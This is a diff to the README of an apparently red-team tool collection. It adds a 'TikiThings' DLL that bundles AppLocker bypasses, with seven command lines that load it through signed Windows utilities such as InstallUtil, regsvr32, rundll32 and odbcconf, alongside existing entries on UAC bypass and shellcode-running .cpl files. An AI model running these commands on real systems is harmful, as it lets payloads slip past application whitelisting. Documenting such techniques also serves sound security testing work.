@@ -56,6 +56,19 @@ A .NET exe used to spawn a high integrity agent using the UAC Token Duplication 
 ### TikiCpl
 Generates a Control Panel (.cpl) formatted DLL that executes gzipped base64 encoded shellcode from a resource.  Following the instructions [here](https://github.com/rvrsh3ll/CPLResourceRunner) to generate shellcode in the correct format.
 
+### TikiThings
+A DLL that integrates AppLocker bypasses from [AllTheThings](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/src/AllTheThings.cs).
+
+```text
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U TikiThings.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U TikiThings.dll
+regsvr32 /s /u TikiThings.dll
+regsvr32 /s TikiThings.dll
+rundll32 TikiThings.dll,EntryPoint
+odbcconf /s /a { REGSVR TikiThings.dll }
+regsvr32 /s /n /i:"blah" TikiThings.dll
+```
+
 
 ## Credits
 
@@ -64,3 +77,4 @@ Generates a Control Panel (.cpl) formatted DLL that executes gzipped base64 enco
 - [Vincent Yiu](https://twitter.com/vysecurity) for inspiration
 - [Kevin Mitnick](@kevinmitnick) for letting me test in his lab
 - [Steve Borosh](https://twitter.com/424f424f) for TikiCpl
+- [Casey Smith](https://twitter.com/subTee) for [AllTheThings](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/src/AllTheThings.cs)
